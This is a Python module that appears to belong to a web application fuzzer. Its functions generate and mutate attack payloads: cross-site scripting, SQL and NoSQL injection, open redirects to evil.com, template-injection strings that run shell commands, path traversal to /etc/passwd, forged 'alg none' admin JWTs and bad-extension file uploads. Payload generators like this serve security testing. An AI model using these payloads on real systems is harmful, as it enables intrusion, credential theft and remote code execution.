from __future__ import annotations
import base64
import json
import random
import re
from typing import List, Optional
import json as _json


def _rand_case(s: str) -> str:
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)


# --- XSS ---
def mutate_xss(p: str) -> str:
    variants = [
        f"<svg onload=alert`{random.randint(1,9)}`>",
        f"\"><img src=x onerror=alert({random.randint(1,9)})>",
        f"<iframe src=javascript:alert({random.randint(1,9)})>",
        f"<details open ontoggle=alert({random.randint(1,9)})>",
        f"</script><script>alert({random.randint(1,9)})</script>",
        f"<a href=javascript:alert({random.randint(1,9)})>x</a>",
    ]
    # mix with original if looks HTML-ish
    if any(t in p.lower() for t in ["<", ">", "script", "onerror", "svg", "iframe"]):
        return random.choice(variants[:-1])
    return random.choice(variants)


# --- SQLi ---
def mutate_sqli(p: str) -> str:
    comments = [" --", " #", " /*", " --+", ";%00"]
    quotes = [("'", '"'), ('"', "'")]
    unions = [" UNION SELECT NULL--", " UNION SELECT 1,2--", " UNION SELECT 1,2,3--"]
    endings = [";--", "--", "#", "/*", "%00"]
    s = p
    # flip quote styles
    if s:
        q1, q2 = random.choice(quotes)
        s = s.replace(q1, q2)
    # random append comment or union
    if random.random() < 0.5:
        s = s + random.choice(comments)
    else:
        s = s + random.choice(unions)
    # optional parens
    if random.random() < 0.3:
        s = ")" + s + "("
    # optional ending
    if random.random() < 0.3:
        s = s + random.choice(endings)
    return s


# --- NoSQL (Mongo) ---
def mutate_nosql(p: str) -> str:
    ops = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "sleep(1000)"}',
        "'|| 'a'=='a",
    ]
    if p.strip().startswith("{"):
        # try inject operator
        try:
            obj = json.loads(p)
            # choose a field or default 'q'
            key = next(iter(obj.keys()), "q")
            obj[key] = json.loads(random.choice(ops[:3]))
            return json.dumps(obj)
        except Exception:
            return random.choice(ops)
    return random.choice(ops)


# --- Redirect ---
def mutate_redirect(p: str) -> str:
    bases = [
        "http://evil.com",
        "//evil.com",
        "///@evil.com",
        "//127.0.0.1/\\@evil.com",
        "https://example.com@evil.com",
    ]
    return random.choice(bases)


# --- Headers ---
def mutate_headers(p: str) -> str:
    # For header value payloads (e.g., User-Agent, Referer) try scriptable values
    xs = [
        f"<script>alert({random.randint(1,9)})</script>",
        f"\"><img src=x onerror=alert({random.randint(1,9)})>",
    ]
    return random.choice(xs)


# --- SSTI ---
def mutate_ssti(p: str) -> str:
    # Expanded across engines: Jinja2, Twig, Freemarker, Velocity, Smarty-like
    payloads = [
        # Jinja2
        "{{7*7}}",
        "{{ cycler.__init__.__globals__.os.getenv('PATH') }}",
        "{{ url_for.__globals__['os'].popen('id').read() }}",
        # Twig
        "{{7*7}}",
        "{{ dump() }}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        # Freemarker
        "${7*7}",
        "${'freemarker'?upper_case}",
        "${('x').getClass().forName('java.lang.System').getProperty('user.home')}",
        # Velocity
        "#set($x=7*7)$x",
        "#set($e='')$e.class.forName('java.lang.Runtime')",
        "#set($x='id')$x",
        # Generic
        "#{7*7}",
        "${{7*7}}",
    ]
    return random.choice(payloads)


# --- LFI ---
def mutate_lfi(p: str) -> str:
    travs = [
        "../../etc/passwd",
        "..%2F..%2Fetc%2Fpasswd",
        "..\\..\\windows\\win.ini",
        "/proc/self/environ",
    ]
    return random.choice(travs)


# --- JWT/Auth ---
def mutate_jwt(p: str) -> str:
    tokens = [
        "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
        "Bearer null",
        "Bearer undefined",
    ]
    return random.choice(tokens)


_CATEGORY_MUTATORS = {
    "xss": mutate_xss,
    "inj_sql": mutate_sqli,
    "inj_nosql": mutate_nosql,
    "redir": mutate_redirect,
    "headers": mutate_headers,
    "ssti": mutate_ssti,
    "lfi": mutate_lfi,
    "jwt": mutate_jwt,
}


def mutate_for_categories(payload: str, categories: List[str]) -> Optional[str]:
    cats = [c for c in categories if c in _CATEGORY_MUTATORS]
    if not cats:
        return None
    cat = random.choice(cats)
    try:
        return _CATEGORY_MUTATORS[cat](payload)
    except Exception:
        return None


# --- Scenario modifiers (for ScenarioRunner) ---
def parse_scenario_directive(text: str) -> tuple[Optional[dict], str]:
    if isinstance(text, str) and text.startswith("[[SCENARIO:") and "]]" in text:
        try:
            first_line = text.splitlines()[0]
            jtext = first_line[len("[[SCENARIO:") : first_line.index("]]", len("[[SCENARIO:"))]
            mods = _json.loads(jtext)
            rest = "\n".join(text.splitlines()[1:])
            return mods, rest
        except Exception:
            return None, text
    return None, text


def render_scenario_directive(mods: dict, base_payload: str) -> str:
    try:
        return f"[[SCENARIO:{_json.dumps(mods, ensure_ascii=False)}]]\n" + (base_payload or "")
    except Exception:
        return base_payload


def _rand_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def mutate_scenario_payload(text: str, scenario_steps: int | None = None) -> str:
    mods, base = parse_scenario_directive(text)
    if mods is None:
        mods = {"steps": {}}
    steps = mods.setdefault("steps", {})
    total = int(scenario_steps or 1)
    pick = str(random.randint(0, max(0, total - 1)))
    step_mod = steps.setdefault(pick, {})
    # Randomly pick an operator to modify step behavior
    choice = random.choice(["header", "path", "param", "method", "url_query", "content_type", "auth", "method_override"])
    if choice == "header":
        hs = step_mod.setdefault("headers", {})
        key = random.choice(["User-Agent", "Referer", "X-Forwarded-Host", "X-Forwarded-For", "Origin"]) 
        val = random.choice([
            "<script>alert(1)</script>",
            "{payload}",
            "evil.example",
            _rand_ip(),
        ])
        hs[key] = val
    elif choice == "path":
        step_mod["path_template"] = random.choice([
            "{payload}",
            "admin/{payload}",
            "..%2F..%2F{payload}",
            "static/{payload}",
        ])
    elif choice == "param":
        step_mod["param_name"] = random.choice(["q", "search", "id", "file", "redirect", "next"]) 
    elif choice == "method":
        step_mod["method"] = random.choice(["GET", "POST", "PUT", "DELETE"]) 
    elif choice == "url_query":
        # Append a query with the payload placeholder
        step_mod["url"] = step_mod.get("url") or ""
        if step_mod["url"] and "?" not in step_mod["url"]:
            step_mod["url"] = step_mod["url"] + "?q={payload}"
        elif step_mod["url"]:
            step_mod["url"] = step_mod["url"] + "&q={payload}"
    elif choice == "content_type":
        hs = step_mod.setdefault("headers", {})
        hs["Content-Type"] = random.choice(["application/json", "text/plain", "application/x-www-form-urlencoded"]) 
        # Optional body template for JSON form
        if hs["Content-Type"] == "application/json" and random.random() < 0.7:
            step_mod["body_template"] = '{"q": "{payload}"}'
    elif choice == "auth":
        hs = step_mod.setdefault("headers", {})
        hs["Authorization"] = random.choice(["Bearer {payload}", "Bearer {token}"]) 
    elif choice == "method_override":
        hs = step_mod.setdefault("headers", {})
        hs["X-HTTP-Method-Override"] = random.choice(["PUT", "DELETE", "PATCH"]) 
    return render_scenario_directive(mods, base)


def crossover_scenario_payload(a: str, b: str) -> Optional[str]:
    ma, ba = parse_scenario_directive(a)
    mb, bb = parse_scenario_directive(b)
    if ma is None and mb is None:
        return None
    out = {"steps": {}}
    for m in [ma or {}, mb or {}]:
        for k, v in (m.get("steps") or {}).items():
            if k not in out["steps"]:
                out["steps"][k] = v
            else:
                # merge headers
                hv = out["steps"][k].setdefault("headers", {})
                hv.update((v or {}).get("headers") or {})
                for field in ["param_name", "path_template", "url", "method", "body_template"]:
                    if field in (v or {}):
                        out["steps"][k][field] = (v or {})[field]
    # choose base payload from better-looking base
    base = ba if len(ba or "") >= len(bb or "") else bb
    return render_scenario_directive(out, base or "")


# --- Upload-specific generators ---
def build_upload_directive(filename: Optional[str] = None, size: Optional[int] = None, content: Optional[str] = None) -> str:
    parts = []
    if filename:
        parts.append(f"FILENAME={filename}")
    if size is not None:
        parts.append(f"SIZE={size}")
    header = "[[" + ";".join(parts) + "]]" if parts else "[[ ]]"
    body = content or ""
    return header + "\n" + body


def mutate_upload(payload: str) -> str:
    # Generate oversized and/or bad-extension files; content carries original payload at the end
    bad_exts = [".exe", ".html", ".svg", ".gif", ".jpg", ".js", ".php"]
    name_bases = ["invoice", "report", "payload", "proof", "image"]
    fname = random.choice(name_bases) + random.choice(bad_exts)
    # Size between 110KB and 300KB
    size = random.randint(110_000, 300_000)
    # Keep the content small; server enforces size
    return build_upload_directive(filename=fname, size=size, content=(payload or "X"))


# Expose upload mutator in map
_CATEGORY_MUTATORS["upload"] = mutate_upload
